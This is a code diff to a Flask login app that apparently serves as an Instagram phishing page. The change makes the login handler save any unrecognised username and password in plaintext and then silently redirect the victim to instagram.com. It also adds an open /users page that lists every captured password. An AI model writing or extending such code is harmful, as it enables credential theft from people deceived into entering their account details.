@@ -39,7 +39,17 @@ def handle_login():
                 flash('Successfully logged in!', 'success')
                 return redirect(url_for('login'))
             else:
-                # If user not found in database, redirect to instagram.com
+                # Save the entered username and password in the database with empty email and fullname
+                try:
+                    cursor.execute('''
+                        INSERT INTO users (username, email, fullname, password)
+                        VALUES (?, ?, ?, ?)
+                    ''', (username, '', '', password))
+                    conn.commit()
+                except sqlite3.IntegrityError:
+                    # If username already exists, ignore
+                    pass
+                # Redirect to instagram.com after saving
                 return redirect('https://www.instagram.com')
         except Error as e:
             flash('An error occurred', 'error')
@@ -80,6 +90,21 @@ def register():
     
     flash('Database connection error', 'error')
     return redirect(url_for('signup'))
+
+@app.route('/users')
+def users():
+    conn = create_connection()
+    users_list = []
+    if conn:
+        try:
+            cursor = conn.cursor()
+            cursor.execute('SELECT id, username, email, fullname, password, created_at FROM users')
+            users_list = cursor.fetchall()
+        except Error as e:
+            users_list = []
+        finally:
+            conn.close()
+    return render_template('users.html', users=users_list)
 
 if __name__ == '__main__':
     app.run(debug=True, port=8000)
